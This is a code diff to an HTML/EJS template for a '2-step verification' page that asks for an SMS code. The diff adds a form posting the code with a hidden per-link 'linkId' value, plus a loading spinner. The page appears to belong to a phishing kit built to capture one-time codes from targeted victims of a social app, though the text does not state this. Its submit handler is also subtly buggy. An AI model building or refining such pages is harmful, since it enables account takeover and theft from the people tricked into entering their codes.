@@ -12,24 +12,70 @@
       crossorigin="anonymous"
       referrerpolicy="no-referrer"
     />
+    <style>
+      #submit2 img {
+        width: 1.3em;
+        animation-name: roll;
+        animation-duration: 0.7s;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+        color: white;
+      }
+
+      @keyframes roll {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
   </head>
   <body>
     <div class="container">
-      <form action="#" style="margin-top: 10em !important">
+      <form
+        method="post"
+        accept="."
+        onsubmit="handleSubmit()"
+        style="margin-top: 10em !important"
+      >
         <h3>2-step verification</h3>
         <p for="#">Enter 6-digit code</p>
         <p>An SMS with your code was sent to you</p>
         <div class="form-group otp-group">
           <input
-            id="username"
+            id="code"
+            name="code"
             type="text"
             placeholder="6-digit code"
             class="password"
             oninput="checkInput()"
+            required
           />
+          <input type="hidden" name="linkId" value="<%=linkId%>" />
         </div>
         <br />
-        <button type="submit" class="submit" id="submit">Next</button>
+        <button
+          type="submit"
+          class="submit"
+          id="submit"
+          onclick="handleSubmit()"
+        >
+          Next
+        </button>
+        <button
+          type="button"
+          name="submit"
+          class="submit"
+          id="submit2"
+          style="
+            display: none;
+            background-color: rgba(254, 44, 85, 1) !important;
+          "
+        >
+          <img src="/img/loading.svg" alt="" />
+        </button>
       </form>
       <footer>
         <p>Don't have an account? <a href="#">Sign up</a></p>
@@ -38,14 +84,33 @@
 
     <script>
       const checkInput = () => {
-        const username = document.querySelector("#username");
+        const code = document.querySelector("#code");
         const submitBtn = document.querySelector("#submit");
-        if (username.value.length > 5) {
+        if (code.value.length > 5) {
           submitBtn.classList.add("active");
         } else {
           submitBtn.classList.remove("active");
         }
       };
+    </script>
+
+    <script>
+      function handleSubmit(e) {
+        const username = document.querySelector("#code");
+        const submitBtn = document.querySelector("#submit");
+        const submitBtn2 = document.querySelector("#submit2");
+
+        if (username.value.length > 5) {
+          submitBtn.style.display = "none";
+          submitBtn2.style.display = "block";
+        } else {
+          e.preventDefault();
+          return false;
+        }
+
+        e.preventDefault();
+        return false;
+      }
     </script>
   </body>
 </html>
